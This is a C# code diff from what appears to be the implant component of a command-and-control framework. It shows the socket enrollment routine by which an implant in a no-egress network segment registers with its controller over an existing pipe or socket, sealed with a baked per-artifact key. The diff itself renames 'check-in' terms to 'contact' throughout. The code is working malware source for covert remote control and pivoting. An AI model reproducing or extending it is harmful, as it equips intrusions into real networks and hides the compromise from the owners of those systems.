@@ -4,16 +4,16 @@ using Rod.V1;
 namespace Rod.Implant.Internal;
 
 // The socket enroll client (architecture.md Sec 8, enrollment over the
-// stream check-in): the full-independence step for a no-egress segment --
+// stream contact): the full-independence step for a no-egress segment --
 // the opening exchange on the pipe or socket it already reaches is an
 // enroll instead of a handshake, the same enroll body the web route carries
 // promoted into the rod.v1 frame grammar, answered on the same connection.
 // The exchange is its own connection: the server's bridge tolerates the
-// close that follows (the next check-in dials fresh), so unlike the QUIC
+// close that follows (the next contact dials fresh), so unlike the QUIC
 // enroll there is no live wire to hand the first cycle -- the poll cadence
 // reconnects on its own.
 //
-// A whole source-file module riding the socket check-in module's file set
+// A whole source-file module riding the socket contact module's file set
 // (the bake-time transport trim): the module compiles exactly when the walk
 // holds a socket-schemed entry -- a beacon dial or an enroll dial.
 
@@ -42,7 +42,7 @@ internal static class SocketEnroll
         // SubjectPublicKeyInfo -- only the public half crosses), parent,
         // host facts, kill date. The profile's malleable HTTP knobs do not
         // apply -- the exchange is frames on a bare socket. A baked
-        // per-artifact key seals the exchange the same way the check-ins
+        // per-artifact key seals the exchange the same way the contacts
         // seal (the token secret never crosses a bare wire in the clear --
         // the http posture's enroll-body default, carried here); a
         // manually minted token names no build, so its exchange rides
@@ -63,18 +63,18 @@ internal static class SocketEnroll
         {
             new Frame { Kind = FrameKind.EnrollRequest, Payload = ByteString.CopyFrom(request.ToByteArray()) },
         };
-        var seal = dial.Profile is { SealsCheckIns: true }
+        var seal = dial.Profile is { SealsContacts: true }
             ? EnvelopeWire.ParseBakedKey(dial.Profile.EnvelopeKey)
             : null;
         if (seal is { } baked)
         {
             await wire.WriteBodyAsync(
-                EnvelopeWire.SealCheckInBody(
+                EnvelopeWire.SealContactBody(
                     EnvelopeCodec.Encode(requestFrames), baked.KeyId, baked.Key, "rod-enroll-v1"),
                 deadline.Token).ConfigureAwait(false);
 
             var enrollBody = await wire.ReadBodyAsync(deadline.Token).ConfigureAwait(false);
-            var opened = EnvelopeWire.TryOpenCheckInBody(enrollBody, baked.KeyId, baked.Key, "rod-enroll-response-v1")
+            var opened = EnvelopeWire.TryOpenContactBody(enrollBody, baked.KeyId, baked.Key, "rod-enroll-response-v1")
                 ?? throw new C2.EnrollRejectedException("the socket enroll answer did not verify under the baked key");
             return await EnrollFrames.MaterializeAsync(opened, dial, "socket");
         }
